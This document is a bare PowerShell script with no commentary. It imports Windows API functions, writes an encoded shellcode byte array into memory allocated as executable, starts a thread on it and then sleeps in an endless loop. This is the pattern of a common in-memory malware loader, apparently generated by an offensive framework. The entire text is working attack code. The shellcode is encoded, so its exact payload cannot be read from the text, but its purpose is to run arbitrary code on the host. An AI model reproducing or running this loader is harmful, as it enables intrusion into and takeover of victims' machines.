$dTmD = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $dTmD -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc4,0xbb,0xed,0xad,0x50,0x81,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x58,0x14,0x03,0x58,0xf9,0x4f,0xa5,0x7d,0xe9,0x12,0x46,0x7e,0xe9,0x72,0xce,0x9b,0xd8,0xb2,0xb4,0xe8,0x4a,0x03,0xbe,0xbd,0x66,0xe8,0x92,0x55,0xfd,0x9c,0x3a,0x59,0xb6,0x2b,0x1d,0x54,0x47,0x07,0x5d,0xf7,0xcb,0x5a,0xb2,0xd7,0xf2,0x94,0xc7,0x16,0x33,0xc8,0x2a,0x4a,0xec,0x86,0x99,0x7b,0x99,0xd3,0x21,0xf7,0xd1,0xf2,0x21,0xe4,0xa1,0xf5,0x00,0xbb,0xba,0xaf,0x82,0x3d,0x6f,0xc4,0x8a,0x25,0x6c,0xe1,0x45,0xdd,0x46,0x9d,0x57,0x37,0x97,0x5e,0xfb,0x76,0x18,0xad,0x05,0xbe,0x9e,0x4e,0x70,0xb6,0xdd,0xf3,0x83,0x0d,0x9c,0x2f,0x01,0x96,0x06,0xbb,0xb1,0x72,0xb7,0x68,0x27,0xf0,0xbb,0xc5,0x23,0x5e,0xdf,0xd8,0xe0,0xd4,0xdb,0x51,0x07,0x3b,0x6a,0x21,0x2c,0x9f,0x37,0xf1,0x4d,0x86,0x9d,0x54,0x71,0xd8,0x7e,0x08,0xd7,0x92,0x92,0x5d,0x6a,0xf9,0xfa,0x92,0x47,0x02,0xfa,0xbc,0xd0,0x71,0xc8,0x63,0x4b,0x1e,0x60,0xeb,0x55,0xd9,0x87,0xc6,0x22,0x75,0x76,0xe9,0x52,0x5f,0xbc,0xbd,0x02,0xf7,0x15,0xbe,0xc8,0x07,0x9a,0x6b,0x64,0x0d,0x0c,0x54,0xd1,0x05,0xa9,0x3c,0x20,0x16,0x30,0x06,0xad,0xf0,0x62,0x28,0xfe,0xac,0xc2,0x98,0xbe,0x1c,0xaa,0xf2,0x30,0x42,0xca,0xfc,0x9a,0xeb,0x60,0x13,0x73,0x43,0x1c,0x8a,0xde,0x1f,0xbd,0x53,0xf5,0x65,0xfd,0xd8,0xfa,0x9a,0xb3,0x28,0x76,0x89,0x23,0xd9,0xcd,0xf3,0xe5,0xe6,0xfb,0x9e,0x09,0x73,0x00,0x09,0x5e,0xeb,0x0a,0x6c,0xa8,0xb4,0xf5,0x5b,0xa3,0x7d,0x60,0x24,0xdb,0x81,0x64,0xa4,0x1b,0xd4,0xee,0xa4,0x73,0x80,0x4a,0xf7,0x66,0xcf,0x46,0x6b,0x3b,0x5a,0x69,0xda,0xe8,0xcd,0x01,0xe0,0xd7,0x3a,0x8e,0x1b,0x32,0xbb,0xf2,0xcd,0x7a,0xc9,0x1a,0xce;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$BVEI=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($BVEI.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$BVEI,0,0,0);for (;;){Start-sleep 60};